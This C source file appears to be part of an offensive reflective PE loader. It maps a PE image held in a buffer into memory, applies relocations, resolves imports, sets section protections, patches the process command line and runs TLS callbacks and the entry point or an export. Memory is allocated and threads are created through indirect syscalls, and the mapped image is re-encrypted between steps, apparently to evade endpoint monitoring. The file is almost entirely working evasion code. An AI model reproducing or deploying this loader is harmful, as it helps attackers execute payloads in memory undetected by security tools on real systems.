#include "main.h"
#include "structs.h"
#include <stdio.h>



/*----------------------------------
  Parse the PE headers and populate
  the struct for further usage
----------------------------------*/
BOOL InitPE(PPEHDRS pPeHdrs, CONTENT cnt) {

	DEBUG_PRINT("[*] Parsing loaded PE file's headers\n");
	pPeHdrs->PeSize = cnt.size;
	pPeHdrs->pPeBuffer = cnt.data;

	//Get NT headers
	pPeHdrs->pNtHeaders = (PIMAGE_NT_HEADERS)(pPeHdrs->pPeBuffer + ((PIMAGE_DOS_HEADER)pPeHdrs->pPeBuffer)->e_lfanew);
	if (pPeHdrs->pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] Cant find valid NT headers.\n");
		return FALSE;
	}

	//Check if DLL or not
	if (pPeHdrs->pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
		DEBUG_PRINT("[*] Image is valid DLL\n");
		pPeHdrs->IsDLL = TRUE;
	}
	else {
		pPeHdrs->IsDLL = FALSE;
	}

	DEBUG_PRINT("[*] Populating Data Directories\n");
	pPeHdrs->pSectHeader = IMAGE_FIRST_SECTION(pPeHdrs->pNtHeaders);
	pPeHdrs->pImportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHdrs->pExportDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	pPeHdrs->pRelocDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHdrs->pExceptDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHdrs->pTslDir = &pPeHdrs->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	DEBUG_PRINT("[*] Parsing finished\n");
	return TRUE;
}



/*-------------------------------
  Prepare some memory for the PE
-------------------------------*/
PBYTE PreparePE(PPEHDRS pPeHdrs) {

	PBYTE pPEBase = NULL;
	SIZE_T peSize = (SIZE_T)pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage;

	DEBUG_PRINT("[*] Allocating memory with size: %d\n", pPeHdrs->pNtHeaders->OptionalHeader.SizeOfImage);

	GetSSN(g_Fun.NtAllocateVirtualMemory.dwSSn, g_Fun.NtAllocateVirtualMemory.pSyscallIndJmp);
	NTSTATUS status = Invoke((HANDLE)-1, &pPEBase, 0, &peSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed allocating memory: 0x%X\n", status);
		return NULL;
	}

	DEBUG_PRINT("[*] Copying PE sections in the allocated memory with start address: 0x%p\n", pPEBase);
	//copy all sections to the allocated memory
	for (DWORD i = 0; i < pPeHdrs->pNtHeaders->FileHeader.NumberOfSections; i++) {
		mymemcpy(
			(PVOID)(pPEBase + pPeHdrs->pSectHeader[i].VirtualAddress),				 //Destination = allocated memory + the RVA of the current section
			(PVOID)(pPeHdrs->pPeBuffer + pPeHdrs->pSectHeader[i].PointerToRawData),  //Source = pointer to the current section's raw data
			pPeHdrs->pSectHeader[i].SizeOfRawData									 //Size = size of the current section's raw data
		);

		//Zero out the PE's sections in the download buffer
		mymemcpy(
			(PVOID)(pPeHdrs->pPeBuffer + pPeHdrs->pSectHeader[i].PointerToRawData),
			NULL,
			pPeHdrs->pSectHeader[i].SizeOfRawData
		);
	}
	DEBUG_PRINT("[*] Finished\n");

	//Encrypt the written data
	temp.data = pPEBase;
	temp.size = peSize;
	Crypt(&temp);

	return pPEBase;
}


/*--------------------------------
 Apply the PE relocations
--------------------------------*/
BOOL ApplyRelocations(PIMAGE_DATA_DIRECTORY pBaseRelocDir, ULONG_PTR pBaseAddr, ULONG_PTR pPrefAddr) {

	//Decrypt before applying relocations
	Crypt(&temp);

	DEBUG_PRINT("[*] Attempting to apply base relocaitons\n");
	PIMAGE_BASE_RELOCATION pBaseReloc = (pBaseAddr + pBaseRelocDir->VirtualAddress);
	ULONG_PTR delta = pBaseAddr - pPrefAddr;

	PBASE_RELOCATION_ENTRY pRelocEntry = NULL;

	//loop trough all relocation blocks
	while (pBaseReloc->VirtualAddress) {

		//pointer to the first relocation entry
		pRelocEntry = (PBASE_RELOCATION_ENTRY)(pBaseReloc + 1);

		//loop trough all relocation entries in the current block
		while ((PBYTE)pRelocEntry != (PBYTE)pBaseReloc + pBaseReloc->SizeOfBlock) {

			//Process the entry based on type
			switch (pRelocEntry->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += delta;
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += (DWORD)delta;
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += HIWORD(delta);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pBaseAddr + pBaseReloc->VirtualAddress + pRelocEntry->Offset)) += LOWORD(delta);
				break;

			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				DEBUG_PRINT("[!] Relocation type is uknown: %d\n", pRelocEntry->Type);
				break;
			}
			//Move to next entry
			pRelocEntry++;
		}
		pBaseReloc = (PIMAGE_BASE_RELOCATION)pRelocEntry;
	}
	DEBUG_PRINT("[*] Finished applying relocations\n");

	//Encrypt again
	Crypt(&temp);
	return TRUE;
}



/*----------------------------------------
  Fix the PE's import table
----------------------------------------*/
BOOL FixImports(PIMAGE_DATA_DIRECTORY pImportTable, PBYTE pPeBaseAddr) {

	//Decrypt
	Crypt(&temp);

	DEBUG_PRINT("[*] Resolving the PE's import table\n");

	//Pointer for a import descriptor for a particular DLL
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;

	//Loop trough import descriptors
	for (SIZE_T i = 0; i < pImportTable->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		//Get the current descriptor
		pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddr + pImportTable->VirtualAddress + i);

		//if both thunks are null the end of the import table is reached
		if (pImportDesc->OriginalFirstThunk == NULL && pImportDesc->FirstThunk == NULL) {
			DEBUG_PRINT("[*] Reached the end of the import descriptors array\n");
			break;
		}

		//Get info from the current descriptor
		LPSTR DllName = (LPSTR)(pPeBaseAddr + pImportDesc->Name);  //Dll Name
		ULONG_PTR uOrgFirstThunkRVA = pImportDesc->OriginalFirstThunk;
		ULONG_PTR uFirstThunkRVA = pImportDesc->FirstThunk;
		SIZE_T ThunkSize = 0x00; // Used to move to the next function (iterating through the IAT and INT)
		HMODULE hModule = NULL;

		//Try to load the DLL that is refenreced in the import descriptor
		hModule = LoadLibraryA(DllName);
		if (!hModule) {
			DEBUG_PRINT("[!] Could not load DLL: %s\n", DllName);
			return FALSE;
		}

		//Loop trough the imported functions
		while (TRUE) {

			//Get pointers to the thunk data
			PIMAGE_THUNK_DATA pOrgFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddr + uOrgFirstThunkRVA + ThunkSize);
			PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddr + uFirstThunkRVA + ThunkSize);
			PIMAGE_IMPORT_BY_NAME pImportByName = NULL;
			PVOID pFuncAddress = NULL;

			// At this point both 'pOrgFirstThunk' & 'pFirstThunk' will have the same values
			// However, to populate the IAT (pFirstThunk), one should use the INT (pOriginalFirstThunk) to retrieve the 
			// functions addresses and patch the IAT (pFirstThunk->u1.Function) with the retrieved address.
			if (pOrgFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL) {
				break;
			}


			//if ordinal flag is set get the function's address trough its ordinal, else trough its name
			if (IMAGE_SNAP_BY_ORDINAL(pOrgFirstThunk->u1.Ordinal)) {
				pFuncAddress = GetProcAddress(hModule, IMAGE_ORDINAL(pOrgFirstThunk->u1.Ordinal));
				//DEBUG_PRINT("\t> Resolved function by ordinal, %s -> %d\n", DllName, (int)pOrgFirstThunk->u1.Ordinal);
				if (!pFuncAddress) {
					DEBUG_PRINT("[!] Cant find the address of function, %s -> %d\n", DllName, (int)pOrgFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			//Get the address trough the function's name
			else {
				pImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddr + pOrgFirstThunk->u1.AddressOfData);
				pFuncAddress = GetProcAddress(hModule, pImportByName->Name);
				//DEBUG_PRINT("\t> Resolved function, %s -> %s\n", DllName, pImportByName->Name);
				if (!pFuncAddress) {
					DEBUG_PRINT("[!] Cant find the address of function, %s -> %s\n", DllName, pImportByName->Name);
					return FALSE;
				}
			}

			//Populate the address in the IAT
			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

			//Move to next function in the arrays
			ThunkSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	//Encrypt
	Crypt(&temp);
	return TRUE;
}



/*------------------------------------------
  Fix the PE sections's memory permissions
------------------------------------------*/
BOOL FixMem(ULONG_PTR pPeBaseAddr, PIMAGE_NT_HEADERS pNtHdrs, PIMAGE_SECTION_HEADER pSectHdrs) {

	//Decrypt
	Crypt(&temp);

	DWORD old = 0;
	SIZE_T secSize = 0;
	PVOID secAddr = NULL;
	NTSTATUS status = NULL;

	DEBUG_PRINT("[*] Fixing sections memory permissions, number of sections: %d\n", pNtHdrs->FileHeader.NumberOfSections);
	
	//Loop trough each section
	for (DWORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD old = NULL, MemProtect = NULL;

		if (!pSectHdrs[i].SizeOfRawData && !pSectHdrs[i].VirtualAddress) {
			DEBUG_PRINT("[*] skipping..");
			continue;
		}

		DEBUG_PRINT("[*] Checking memory protection for section: %d\n", i);
		DEBUG_PRINT("\t> Section name: %s\n", pSectHdrs[i].Name);
		//Get memory permissions based on section characteristics
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
			MemProtect = PAGE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_WRITECOPY\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ) {
			MemProtect = PAGE_READONLY;
			DEBUG_PRINT("\t> PAGE_READONLY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_READWRITE;
			DEBUG_PRINT("\t> PAGE_READWRITE\n");
		}
		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			MemProtect = PAGE_EXECUTE;
			DEBUG_PRINT("\t> PAGE_EXECUTE\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
			MemProtect = PAGE_EXECUTE_WRITECOPY;
			DEBUG_PRINT("\t> PAGE_EXECUTE_WRITECOPY\n");
		}
		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
			MemProtect = PAGE_EXECUTE_READ;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READ\n");
		}
		if (
			(pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			&& (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)
			) {
			MemProtect = PAGE_EXECUTE_READWRITE;
			DEBUG_PRINT("\t> PAGE_EXECUTE_READWRITE\n");
		}

		secSize = pSectHdrs[i].SizeOfRawData;
		secAddr = (pPeBaseAddr + pSectHdrs[i].VirtualAddress);

		GetSSN(g_Fun.NtProtectVirtualMemory.dwSSn, g_Fun.NtProtectVirtualMemory.pSyscallIndJmp);
		status = Invoke((HANDLE)-1, &secAddr, &secSize, MemProtect, &old);
		if (status != 0x00) {
			DEBUG_PRINT("[!] Failed applying memory protection for section: %d, error: 0x%X\n", i, status);
			return FALSE;
		}

	}

	DEBUG_PRINT("[*] Finished applying sections memory protections\n");
	return TRUE;
}



/*------------------------------------
  Prepare the arguments for the PE
------------------------------------*/
VOID PrepareArgs(LPCSTR argsToPass) {
	PRTL_USER_PROCESS_PARAMETERS pParams = ((PPEB)__readgsqword(0x60))->ProcessParameters;

	//Zero out the memory
	mymemcpy(pParams->CommandLine.Buffer, NULL, (pParams->CommandLine.Length * sizeof(WCHAR)));

	if (argsToPass) {
		WCHAR* wCmd = NULL;
		WCHAR* wArgs = NULL;
		int charSize = 0x00;

		//Convert from char to wchar
		wArgs = HeapAlloc(GetHeap(), HEAP_ZERO_MEMORY, ((strlen(argsToPass) * sizeof(WCHAR)) + sizeof(WCHAR)));
		if (!wArgs) {
			DEBUG_PRINT("[!] Failed allocating memory for arguments\n");
			return;
		}

		CharStringToWCharString(wArgs, argsToPass, ((strlen(argsToPass) * sizeof(WCHAR)) + sizeof(WCHAR)));

		//Prepare the new command line arguments
		wCmd = HeapAlloc(GetHeap(), HEAP_ZERO_MEMORY, ((wcslen(wArgs) + pParams->ImagePathName.Length) * sizeof(WCHAR) + sizeof(WCHAR)));
		if (!wCmd) {
			DEBUG_PRINT("[!] Failed allocating memory for command line\n");
			return;
		}

		wsprintfW(wCmd, L"\"%s\" %s", pParams->ImagePathName.Buffer, wArgs);

		//Overwrite the old one
		lstrcpyW(pParams->CommandLine.Buffer, wCmd);
		pParams->CommandLine.Length = pParams->CommandLine.MaximumLength = wcslen(pParams->CommandLine.Buffer) * sizeof(WCHAR) + sizeof(WCHAR);
		pParams->CommandLine.MaximumLength += sizeof(WCHAR);

		HeapFree(GetProcessHeap(), 0x00, wArgs);
		HeapFree(GetProcessHeap(), 0x00, wCmd);
		DEBUG_PRINT("[*] Finished patching command line arguments\n");
		return;
	}
	//If not args just overwrite with image name
	lstrcpyW(pParams->CommandLine.Buffer, pParams->ImagePathName.Buffer);
	pParams->CommandLine.Length = pParams->CommandLine.MaximumLength = wcslen(pParams->CommandLine.Buffer) * sizeof(WCHAR) + sizeof(WCHAR);
	pParams->CommandLine.MaximumLength += sizeof(WCHAR);
}



/*-------------------------------------
  Execute the PE's entry point
-------------------------------------*/
BOOL Execute(ULONG_PTR pPeBaseAddr, PPEHDRS pPeHdrs, IN OPTIONAL LPCSTR exportedFunc) {

	//PE entrypoint
	PVOID entry = (pPeBaseAddr + pPeHdrs->pNtHeaders->OptionalHeader.AddressOfEntryPoint);

	//Register exception handles
	if (pPeHdrs->pExceptDir->Size) {
		PIMAGE_RUNTIME_FUNCTION_ENTRY pFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddr + pPeHdrs->pExceptDir->VirtualAddress);

		//Register function table
		if (!RtlAddFunctionTable(pFuncEntry, (pPeHdrs->pExceptDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), pPeBaseAddr)) {
			DEBUG_PRINT("[!] Failed registering function table\n");
		}
	}

	//Execute TLS callbacks if any
	if (pPeHdrs->pTslDir->Size) {
		PIMAGE_TLS_DIRECTORY pTlsDir = (PIMAGE_TLS_DIRECTORY)(pPeBaseAddr + pPeHdrs->pTslDir->VirtualAddress);
		PIMAGE_TLS_CALLBACK* pTlsCallback = (PIMAGE_TLS_CALLBACK*)(pTlsDir->AddressOfCallBacks);

		for (int i = 0; pTlsCallback[i] != NULL; i++) {
			pTlsCallback[i]((LPVOID)pPeBaseAddr, DLL_PROCESS_ATTACH, NULL);
		}
	}

	//Executing DLL
	if (pPeHdrs->IsDLL) {
		DLLMAIN pMain = (DLLMAIN)entry;
		pMain((HINSTANCE)pPeBaseAddr, DLL_PROCESS_ATTACH, NULL);

		//If an exported function is specified, fetch its address and create a separate thread for it
		if (pPeHdrs->pExportDir->Size && pPeHdrs->pExportDir->VirtualAddress && exportedFunc) {
			PVOID exportedFuncAddr = FetchExportAddress(pPeHdrs->pExportDir, pPeBaseAddr, exportedFunc);
			if (exportedFuncAddr != NULL) {

				HANDLE hThread = NULL;
				GetSSN(g_Fun.NtCreateThreadEx.dwSSn, g_Fun.NtCreateThreadEx.pSyscallIndJmp);
				NTSTATUS status = Invoke(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, exportedFuncAddr, NULL, FALSE, NULL, NULL, NULL, NULL);
				if (status != 0x00) {
					DEBUG_PRINT("[!] Failed creating thread for %s\n", exportedFunc);
					return FALSE;
				}
				if (hThread) {
					GetSSN(g_Fun.NtWaitForSingleObject.dwSSn, g_Fun.NtWaitForSingleObject.pSyscallIndJmp);
					Invoke(hThread, FALSE, NULL);
				}
			}
		}
	}
	//Executing EXE
	else {
		MAIN pMain = (MAIN)entry;
		DEBUG_PRINT("[*] PE Output:\n\n");
		pMain();
	}
}